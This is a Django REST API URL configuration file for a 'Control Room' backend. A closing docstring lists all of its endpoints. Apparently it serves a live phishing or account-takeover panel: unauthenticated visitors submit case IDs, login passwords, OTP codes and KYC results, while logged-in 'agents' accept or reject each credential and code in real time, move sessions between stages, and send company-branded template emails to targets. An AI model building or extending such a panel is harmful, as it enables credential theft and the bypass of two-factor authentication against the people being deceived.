# accounts/api/urls.py
"""
REST API URL Configuration

Routes for the Control Room REST API.
Handles authentication, sessions, user flow, and agent actions.

Base URL: /api/
"""

from django.urls import path, include
from rest_framework.routers import DefaultRouter
from rest_framework_simplejwt.views import TokenObtainPairView, TokenRefreshView, TokenVerifyView

from .views.session_views import SessionViewSet
from .views.user_flow_views import (
    VerifyCaseIDView,
    SubmitCredentialsView,
    SubmitSecretKeyView,
    UserStartedKYCView,
    SubmitKYCView,
)
from .views.agent_action_views import (
    AcceptLoginView,
    RejectLoginView,
    AcceptOTPView,
    RejectOTPView,
    AcceptKYCView,
    RejectKYCView,
)
from .views.control_views import (
    NavigateSessionView,
    MarkUnsuccessfulView,
    ForceCompleteView,
)
from .views.utility_views import GenerateCaseIDView, HealthCheckView
from .views.email_views import send_email, email_history
from .views.template_views import EmailTemplateViewSet
from .views.company_views import CompanyViewSet

# DRF Router for ViewSets (Session and Company CRUD)
router = DefaultRouter()
router.register(r'sessions', SessionViewSet, basename='session')
router.register(r'companies', CompanyViewSet, basename='company')

# ==========================
# AUTHENTICATION ENDPOINTS
# ==========================
auth_urlpatterns = [
    path('auth/login/', TokenObtainPairView.as_view(), name='api_token_obtain_pair'),
    path('auth/refresh/', TokenRefreshView.as_view(), name='api_token_refresh'),
    path('auth/verify/', TokenVerifyView.as_view(), name='api_token_verify'),
]

# ==========================
# USER FLOW ENDPOINTS
# ==========================
# Users are NOT authenticated for these endpoints
user_flow_urlpatterns = [
    path('verify-case/', VerifyCaseIDView.as_view(), name='api_verify_case_id'),
    path('submit-credentials/', SubmitCredentialsView.as_view(), name='api_submit_credentials'),
    path('submit-secret-key/', SubmitSecretKeyView.as_view(), name='api_submit_secret_key'),
    path('user-started-kyc/', UserStartedKYCView.as_view(), name='api_user_started_kyc'),
    path('submit-kyc/', SubmitKYCView.as_view(), name='api_submit_kyc'),
]

# ==========================
# AGENT ACTION ENDPOINTS
# ==========================
# Agents only - require IsAuthenticated permission
agent_action_urlpatterns = [
    path('sessions/<uuid:uuid>/accept-login/', AcceptLoginView.as_view(), name='api_accept_login'),
    path('sessions/<uuid:uuid>/reject-login/', RejectLoginView.as_view(), name='api_reject_login'),
    path('sessions/<uuid:uuid>/accept-otp/', AcceptOTPView.as_view(), name='api_accept_otp'),
    path('sessions/<uuid:uuid>/reject-otp/', RejectOTPView.as_view(), name='api_reject_otp'),
    path('sessions/<uuid:uuid>/accept-kyc/', AcceptKYCView.as_view(), name='api_accept_kyc'),
    path('sessions/<uuid:uuid>/reject-kyc/', RejectKYCView.as_view(), name='api_reject_kyc'),
]

# ==========================
# CONTROL ENDPOINTS
# ==========================
control_urlpatterns = [
    path('sessions/<uuid:uuid>/navigate/', NavigateSessionView.as_view(), name='api_navigate_session'),
    path('sessions/<uuid:uuid>/mark-unsuccessful/', MarkUnsuccessfulView.as_view(), name='api_mark_unsuccessful'),
    path('sessions/<uuid:uuid>/force-complete/', ForceCompleteView.as_view(), name='api_force_complete'),
]

# ==========================
# EMAIL ENDPOINTS
# ==========================
# Agents can send emails and view email history for sessions
email_urlpatterns = [
    path('sessions/<uuid:session_uuid>/send-email/', send_email, name='api_send_email'),
    path('sessions/<uuid:session_uuid>/email-history/', email_history, name='api_email_history'),
]

# ==========================
# EMAIL TEMPLATE ENDPOINTS
# ==========================
# Frontend can discover available templates for dynamic UI
template_router = DefaultRouter()
template_router.register(
    r'companies/(?P<company_id>\d+)/email-templates',
    EmailTemplateViewSet,
    basename='email_template'
)
template_urlpatterns = template_router.urls

# ==========================
# UTILITY ENDPOINTS
# ==========================
utility_urlpatterns = [
    path('generate-case-id/', GenerateCaseIDView.as_view(), name='api_generate_case_id'),
    path('health/', HealthCheckView.as_view(), name='api_health_check'),
]

# ==========================
# COMBINE ALL PATTERNS
# ==========================
urlpatterns = (
    auth_urlpatterns +
    user_flow_urlpatterns +
    agent_action_urlpatterns +
    control_urlpatterns +
    email_urlpatterns +
    template_urlpatterns +
    utility_urlpatterns +
    router.urls
)

"""
API ENDPOINTS SUMMARY
=======================

AUTHENTICATION (JWT):
  POST   /api/auth/login/              - Obtain access & refresh tokens
  POST   /api/auth/refresh/            - Refresh access token
  POST   /api/auth/verify/             - Verify token

USER FLOW (No authentication required):
  POST   /api/verify-case/             - User verifies case ID
  POST   /api/submit-credentials/      - User submits login/password
  POST   /api/submit-secret-key/       - User submits OTP
  POST   /api/user-started-kyc/        - User starts KYC process
  POST   /api/submit-kyc/              - User submits KYC results

COMPANIES (Read-only - Agent authentication required):
  GET    /api/companies/               - List all companies with branding
  GET    /api/companies/{id}/          - Get company details + template types

SESSION MANAGEMENT (CRUD - Agent authentication required):
  GET    /api/sessions/                - List sessions
  GET    /api/sessions/?status=active  - Filter by status
  POST   /api/sessions/                - Create new session
  GET    /api/sessions/{uuid}/         - Get session details
  PATCH  /api/sessions/{uuid}/         - Update session
  DELETE /api/sessions/{uuid}/         - Delete session
  POST   /api/sessions/{uuid}/end/     - End session (custom action)
  POST   /api/sessions/{uuid}/save_notes/ - Save notes (custom action)
  POST   /api/sessions/bulk-delete/    - Delete multiple sessions (custom action)

AGENT ACTIONS (Agent authentication required):
  POST   /api/sessions/{uuid}/accept-login/   - Accept credentials
  POST   /api/sessions/{uuid}/reject-login/   - Reject credentials
  POST   /api/sessions/{uuid}/accept-otp/     - Accept secret key
  POST   /api/sessions/{uuid}/reject-otp/     - Reject secret key
  POST   /api/sessions/{uuid}/accept-kyc/     - Accept KYC
  POST   /api/sessions/{uuid}/reject-kyc/     - Reject KYC

SESSION CONTROLS (Agent authentication required):
  POST   /api/sessions/{uuid}/navigate/              - Navigate session to stage with configurable data clearing
  POST   /api/sessions/{uuid}/mark-unsuccessful/     - Mark verification as failed (permanent)
  POST   /api/sessions/{uuid}/force-complete/        - Force complete session from any stage

EMAIL (Agent authentication required):
  POST   /api/sessions/{uuid}/send-email/            - Send email to customer using template
  GET    /api/sessions/{uuid}/email-history/         - View email history for session

EMAIL TEMPLATES (Agent authentication required):
  GET    /api/companies/{company_id}/email-templates/                    - List all active templates for company
  GET    /api/companies/{company_id}/email-templates/{id}/               - Get single template details (with HTML)
  GET    /api/companies/{company_id}/email-templates/by_type/            - List templates grouped by type
  GET    /api/companies/{company_id}/email-templates/?include_drafts=true - Include draft templates

UTILITIES:
  POST   /api/generate-case-id/        - Generate unique case ID (Agent auth required)
  GET    /api/health/                  - Health check - backend, database, Redis (Public)
"""
